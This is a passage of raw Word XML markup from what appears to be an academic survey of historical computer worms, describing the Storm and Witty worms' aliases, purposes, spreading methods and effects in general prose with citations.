      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">the worm had a bug in its random number generator that caused it to actually miss some Internet IP addresses as targets.  One recommendation given to counter </w:t>
      </w:r>
      <w:r w:rsidR="00FA2736">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>network congestion</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> is to use traffic shaping or quality of service even on internal high-speed </w:t>
      </w:r>
      <w:r w:rsidR="008F0D19">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>LANs</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to prevent a few machines from causing the network to </w:t>
      </w:r>
      <w:r w:rsidR="00D1229E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>be overloaded.  A</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> benevolent worm it could make use of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>QoS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ToS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> flags in the IP packets to allow smart network routers and switches to limit the worms network usage.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00400D80">
      <w:pPr>
        <w:pStyle w:val="TH2"/>
      </w:pPr>
      <w:bookmarkStart w:id="16" w:name="_Toc321736788"/>
      <w:r w:rsidRPr="00861880">
        <w:t>Worm Name:  Storm</w:t>
      </w:r>
      <w:bookmarkEnd w:id="16"/>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Aliases:  W32/Small.DAM, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Trojan.Peacomm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="000C5C31" w:rsidRDefault="000C5C3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Sources:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="000C5C31" w:rsidRDefault="00CB26A3" w:rsidP="000C5C31">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000C5C31">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Schneier, Bruce. “The Storm Worm.” Schneier on Security. 4 Oct 2007. Accessed: 1 Nov. 2011. &lt;http://www.schneier.com/blog/archives/2007/10/the_storm_worm.html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="000C5C31" w:rsidRDefault="00CB26A3" w:rsidP="000C5C31">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000C5C31">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Stewart, Joe. “Storm Worm </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000C5C31">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>DDoS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000C5C31">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Attack.” Dell </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000C5C31">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>SecureWorks</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000C5C31">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. 8 Feb 2007. Accessed: 1 Nov. 2011. &lt;http://www.secureworks.com/research/threats/storm-worm/&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00D27202"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t xml:space="preserve">Malicious.  </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Join</w:t>
      </w:r>
      <w:r w:rsidR="00340A5F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> infected machine </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>to</w:t>
      </w:r>
      <w:r w:rsidR="00340A5F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00340A5F">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 xml:space="preserve"> botnet to give control to </w:t>
      </w:r>
      <w:r w:rsidR="00E81DA9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>malicious user.  Possibly for the purpose of reselling the botnet to others</w:t>
      </w:r>
      <w:r w:rsidR="00D60269">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00281D1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Methods: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Attachment in e-mail usually with subject of recent popular new</w:t>
      </w:r>
      <w:r w:rsidR="00963D37">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> story.  Once infected the host could take on the roll of sending out e-mails to infect other computers or it could wait for instructions.  It downloaded a second payload via URLs suited for the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>eDonkey</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Overnet</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> protocol and network.  Since it was more patient it went longer without being detected.  The person in control of the worm was able to insert new e-mail messages with links to fake YouTube videos and other sites in an effort to provide new enticing content for users to run.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="001D206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730A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>This was a n</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ew hybrid version of a worm that also had a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>trojan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and botnet rolled into it.  Estimates project that it infected over 1 million computers.  Once infected a host could take on 1 of 3 rolls:  spread to other hosts, serve as a command and control server, or standby and wait for orders.  In addition the payload had a mutation algorithm that changed every 30 minutes making antivirus software ineffective at detecting it.  </w:t>
      </w:r>
      <w:r w:rsidR="007E3C10">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ome anti-spam sites that began to filter the worm’s malicious e-mail messages had a denial of service attack </w:t>
      </w:r>
      <w:r w:rsidR="00CD2C0A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">performed </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>against them from the infected hosts.  This was an attempt to prevent them from stopping the spread of the worm.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00D653D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Because the worm was more patient and not as aggressive in spreading itself it went undetected much longer.  In addition it was also very careful to not use up too much cpu or memory </w:t>
      </w:r>
      <w:r w:rsidR="00786AED">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">on </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">an infected host in order to avoid the end-user noticing something was wrong with their system.  Many worms before Storm would consume so many resources that the end-user would notice slow performance on their system and usually have the machine checked out.  In addition because it used peer-to-peer technology for the control servers it had no centralized command server.  This made disabling the botnet very difficult to accomplish.  Simply blocking a set of IPs at the firewall level would not be sufficient.  It also made it easier for the infected hosts to communicate with other infected hosts outside a private network and on the Internet.  </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00400D80">
      <w:pPr>
        <w:pStyle w:val="TH2"/>
      </w:pPr>
      <w:bookmarkStart w:id="17" w:name="_Toc321736789"/>
      <w:r w:rsidRPr="00861880">
        <w:t>Worm Name:  Witty</w:t>
      </w:r>
      <w:bookmarkEnd w:id="17"/>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Aliases:  </w:t>
      </w:r>
      <w:r w:rsidR="00105AA2">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>None</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AE3847" w:rsidRDefault="00AE384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Sources:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00AE3847" w:rsidRDefault="00CB26A3" w:rsidP="00AE3847">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AE3847">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Shannon, Colleen. “The Spread of the Witty Worm.” Malware Recon. IEEE Security &amp; Privacy. IEEE: Jul 2004. Accessed: 23 Jan 2012.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00AE384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Purpose:</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Infected the device and deleted a random part of the hard drive’s contents</w:t>
      </w:r>
      <w:r w:rsidR="007D2B1F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> e</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ventually render</w:t>
      </w:r>
      <w:r w:rsidR="007D2B1F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ing</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the machine unusable.  Since the infected hosts were usually security devices it would cause the security protection to stop functioning.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00DA7E5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Methods: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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>RealSecure</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Server Sensor, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>RealSecure</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Desktop, and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>BlackICE</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. The worm took advantage of a security </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ﬂaw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> in these </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ﬁrewall</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> applications that </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>eEye</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Digital Security discov</w:t>
      </w:r>
      <w:r w:rsidR="00574F3E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ered earlier in March"</w:t>
      </w:r>
      <w:r w:rsidR="006543C3">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Shannon 2004).</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidR="001A326F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>It e</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">xploited a buffer overflow by sending packets on a network that when inspected by the security devices actually triggered the exploit.  Thus it didn’t have to attempt </w:t>
      </w:r>
      <w:r w:rsidR="00F8063C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>direct communication</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> with the target but instead</w:t>
      </w:r>
      <w:r w:rsidR="00F8063C">
        <w:rPr>
